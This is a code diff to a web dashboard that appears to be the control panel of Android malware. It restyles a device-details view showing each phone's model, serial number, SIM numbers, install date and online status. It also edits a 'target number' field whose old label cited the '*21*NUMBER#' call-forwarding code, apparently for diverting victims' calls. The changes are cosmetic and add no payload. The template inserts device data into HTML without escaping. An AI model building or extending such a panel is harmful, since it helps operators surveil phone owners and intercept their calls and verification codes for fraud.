@@ -61,6 +61,10 @@
         .status-badge { display: inline-block; padding: 2px 12px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; margin-top: 5px; border: 1px solid rgba(255,255,255,0.5); }
         .status-online { background: var(--success); }
         .status-offline { background: var(--danger); }
+        .data-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        .data-table th, .data-table td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
+        .data-table th { background: #f8fafc; color: #555; font-size: 13px; width: 40%; }
+        .data-table td { color: #333; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -248,15 +252,20 @@
                 const d = await r.json();
                 const dev = d.device;
                 const statusHtml = dev.isOnline ? '<span style="color:var(--success);font-weight:bold;">ONLINE</span>' : '<span style="color:var(--danger);font-weight:bold;">OFFLINE</span>';
+                const installDate = dev.registrationTimestamp ? new Date(dev.registrationTimestamp).toLocaleString() : 'N/A';
+                
                 document.getElementById('modalBody').innerHTML = `
-                    <div style="background:#f1f5f9; padding:20px; border-radius:12px; line-height: 2;">
-                        <div><b>Model:</b> ${dev.model || 'N/A'}</div>
-                        <div><b>Serial:</b> ${dev.serialNumber || 'N/A'}</div>
-                        <div><b>Android Version:</b> ${dev.androidVersion || 'N/A'}</div>
-                        <div><b>SIM 1:</b> ${dev.sim1 || 'N/A'} <i class="fas fa-copy" style="color:var(--blue);cursor:pointer;" onclick="copyText('${dev.sim1}')"></i></div>
-                        <div><b>SIM 2:</b> ${dev.sim2 || 'N/A'} <i class="fas fa-copy" style="color:var(--blue);cursor:pointer;" onclick="copyText('${dev.sim2}')"></i></div>
-                        <div><b>Last Seen:</b> ${formatLastSeen(dev.lastSeen)}</div>
-                        <div><b>Status:</b> ${statusHtml}</div>
+                    <div style="background:#f1f5f9; padding:10px; border-radius:12px;">
+                        <table class="data-table">
+                            <tr><th>Model:</th><td>${dev.model || 'N/A'}</td></tr>
+                            <tr><th>Serial:</th><td>${dev.serialNumber || 'N/A'}</td></tr>
+                            <tr><th>Android Version:</th><td>${dev.androidVersion || 'N/A'}</td></tr>
+                            <tr><th>SIM 1:</th><td>${dev.sim1 || 'N/A'} <i class="fas fa-copy" style="color:var(--blue);cursor:pointer;margin-left:5px;" onclick="copyText('${dev.sim1}')"></i></td></tr>
+                            <tr><th>SIM 2:</th><td>${dev.sim2 || 'N/A'} <i class="fas fa-copy" style="color:var(--blue);cursor:pointer;margin-left:5px;" onclick="copyText('${dev.sim2}')"></i></td></tr>
+                            <tr><th>Install Date:</th><td>${installDate}</td></tr>
+                            <tr><th>Last Seen:</th><td>${formatLastSeen(dev.lastSeen)}</td></tr>
+                            <tr><th>Status:</th><td>${statusHtml}</td></tr>
+                        </table>
                     </div>`;
             } catch(e) { toast('Error', true); }
         }
@@ -369,7 +378,7 @@
                     </select>
                 </div>
                 <div class="input-group">
-                    <label>TARGET NUMBER (ex: *21*NUMBER#):</label>
+                    <label>ENTER TARGET NUMBER:</label>
                     <input type="text" id="cfNum" placeholder="Enter target number">
                 </div>
                 <div style="display:flex; gap:10px; margin-top:20px;">
